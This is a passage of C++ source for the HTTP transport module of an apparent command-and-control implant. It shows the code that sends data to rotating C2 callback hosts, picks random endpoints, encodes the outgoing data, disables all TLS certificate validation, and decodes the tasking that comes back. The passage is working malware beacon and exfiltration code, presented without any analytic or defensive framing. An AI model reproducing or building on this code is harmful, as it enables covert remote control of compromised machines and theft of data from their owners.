    _In_ WCHAR*   Path,
    _In_ WCHAR*   Headers,
    _In_ MM_INFO* Body,
    _In_ BOOL     Secure
) -> BOOL {
    ULONG HttpFlags = INTERNET_FLAG_RELOAD;
    ULONG OptFlags = 0;
    
    if ( Secure ) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_WRONG_USAGE |
                   SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }
    
    Ctx->RequestHandle = Self->Wininet.HttpOpenRequestW( 
        Ctx->ConnectHandle, Method, Path, NULL, NULL, NULL, HttpFlags, 0 
    );
    
    if ( !Ctx->RequestHandle ) {
        KhDbg("Failed to open HTTP request - Error: %d", KhGetError);
        return FALSE;
    }
    
    Self->Wininet.InternetSetOptionW( Ctx->RequestHandle, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );
    
    BOOL Success = Self->Wininet.HttpSendRequestW(
        Ctx->RequestHandle, Headers, Headers ? Str::LengthW( Headers ) : 0, 
        Body->Ptr, Body->Size
    );
    
    if ( !Success ) {
        KhDbg("Failed to send HTTP request - Error: %d", KhGetError);
        return FALSE;
    }
    
    KhDbg("HTTP request sent");
    return TRUE;
}

auto DECLFN Transport::HttpSend(
    _In_      MM_INFO* SendData,
    _Out_opt_ MM_INFO* RecvData
) -> BOOL {
    if ( RecvData && RecvData->Ptr ) {
        RecvData->Ptr  = nullptr;
        RecvData->Size = 0;
    }
    
    HTTP_CONTEXT Ctx = { 0 };
    
    // Get C2 callback
    HTTP_CALLBACKS* Callback = this->StrategyRot();
    if ( ! Callback ) {
        KhDbg("Failed to get C2 callback");
        return FALSE;
    }
    
    KhDbg("host: %ls:%d useragent: %ls secure: %s", Callback->Host, Callback->Port, Callback->UserAgent, Self->Config.Http.Secure ? "TRUE" : "FALSE");
    
    WCHAR*      MethodStr   = nullptr;
    HTTP_METHOD Method      = { 0 };
    MM_INFO     DecodedData = { 0 };
    MM_INFO     RespData    = { 0 };
    MM_INFO     EncodedData = { 0 };

    // Allocate initial buffer for RespData 
    RespData.Ptr = (PBYTE)hAlloc( 1 );
    if ( ! RespData.Ptr ) {
        KhDbg("Failed to allocate initial RespData buffer");
        return FALSE;
    }

    Ctx.ObjectFree.Length++;
    Ctx.ObjectFree.Ptr = (PVOID*)hAlloc( sizeof(PVOID) * Ctx.ObjectFree.Length );
    Ctx.ObjectFree.Ptr[ Ctx.ObjectFree.Length - 1 ] = RespData.Ptr;
    
    if ( ! this->PrepareUrlAndMethod( &Ctx, Callback, Self->Config.Http.Secure, &MethodStr, &Method ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Select endpoint
    HTTP_ENDPOINT* Endpoint = Method.Endpoints[Rnd32() % Method.EndpointCount];
    
    KhDbg("method: %ls endpoint: %ls", MethodStr, Endpoint->Path);
    
    OUTPUT_FORMAT  ClientOut     = Endpoint->ClientOutput;
    OUTPUT_FORMAT  ServerOut     = Endpoint->ServerOutput;
    OUTPUT_TYPE    ServerOutType = ServerOut.Type;
    OUTPUT_TYPE    ClientOutType = ClientOut.Type;
    PROXY_SETTINGS Proxy         = Self->Config.Http.Proxy;
    BOOL           Secure        = Self->Config.Http.Secure;
    
    // Encode client data
    if ( ! this->EncodeClientData( &Ctx, SendData, &EncodedData, &ClientOut ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Process client output
    if ( ! this->ProcessClientOutput( &Ctx, &EncodedData, ClientOutType, Endpoint, &Method, &ClientOut ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Open internet session
    if ( ! this->OpenInternetSession( &Ctx, Callback, Proxy.Enabled, Proxy.Url ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Connect to server
    if ( ! this->ConnectToServer( &Ctx, Callback, Proxy.Enabled, Proxy.Username, Proxy.Password ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Set cookies if needed
    if ( Method.CookiesCount ) {
        for ( int i = 0; i < Method.CookiesCount; i++ ) {
            Self->Wininet.InternetSetCookieW( Ctx.wTargetUrl, Method.Cookies[i]->Key, Method.Cookies[i]->Value );
            KhDbg("Cookie set - Key: %ls", Method.Cookies[i]->Key);
        }
    }
    
    // Send HTTP request
    if ( ! this->SendHttpRequest( 
        &Ctx, MethodStr, Ctx.Path ? Ctx.Path : Endpoint->Path,
        Ctx.Headers ? Ctx.Headers : Method.Headers, &Ctx.Body, Secure
    )) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Get HTTP status code
    ULONG HttpStatusCode = 0;
    ULONG HttpStatusSize = sizeof( HttpStatusCode );
    
    Self->Wininet.HttpQueryInfoW(
        Ctx.RequestHandle, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &HttpStatusCode, &HttpStatusSize, nullptr
    );
    
    KhDbg("HTTP status code: %lu", HttpStatusCode);
    
    if ( HttpStatusCode < 200 || HttpStatusCode >= 300 ) {
        KhDbg("HTTP request failed - Status: %lu", HttpStatusCode);
        return CleanupHttpContext( &Ctx );
    }
    
    // Process server response
    if ( ! this->ProcessServerOutput( &Ctx, Ctx.RequestHandle, Ctx.cTargetUrl, ServerOutType, &ServerOut, &RespData ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    // Check for do-nothing buffer
    if ( Mem::Cmp( RespData.Ptr, Method.DoNothingBuff.Ptr, Method.DoNothingBuff.Size ) ) {
        KhDbg("Response matches do-nothing buffer");
        return CleanupHttpContext( &Ctx );
    }
    
    // Decode server data
    if ( ! this->DecodeServerData( &Ctx, &RespData, &DecodedData, &ServerOut ) ) {
        return CleanupHttpContext( &Ctx );
    }
        
    // Return response to caller
    if ( RecvData ) {
        RecvData->Ptr  = DecodedData.Ptr;
        RecvData->Size = DecodedData.Size;
        KhDbg("Response returned - Size: %zu", DecodedData.Size);
    }
    
    Ctx.Success = TRUE;
    return CleanupHttpContext( &Ctx );
}

#endif

